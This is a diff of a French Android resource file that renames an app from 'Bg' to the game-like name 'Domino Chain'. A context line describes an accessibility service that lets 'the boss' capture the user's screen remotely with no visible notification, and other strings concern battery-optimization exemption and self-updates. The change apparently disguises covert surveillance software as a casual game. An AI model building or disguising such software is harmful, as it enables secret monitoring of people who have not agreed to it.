@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Bg</string>
+    <string name="app_name">Domino Chain</string>
     <string name="accessibility_service_description">Permet au boss de capturer votre écran à distance, sans notification visible.</string>
     <string name="battery_optimization_link">Désactiver l\'optimisation batterie pour cette app</string>
     <string name="settings">Paramètres</string>
@@ -86,7 +86,7 @@
     <string name="update_available_title">Mise à jour disponible</string>
     <string name="update_available_message">Une nouvelle version de l\'application est disponible.</string>
     <string name="update_download">Télécharger</string>
-    <string name="update_download_title">Mise à jour Bg</string>
+    <string name="update_download_title">Mise à jour Domino Chain</string>
     <string name="update_download_description">Téléchargement de la nouvelle version</string>
     <string name="update_download_started">Téléchargement de la mise à jour lancé</string>
     <string name="update_download_failed">Le téléchargement de la mise à jour a échoué</string>
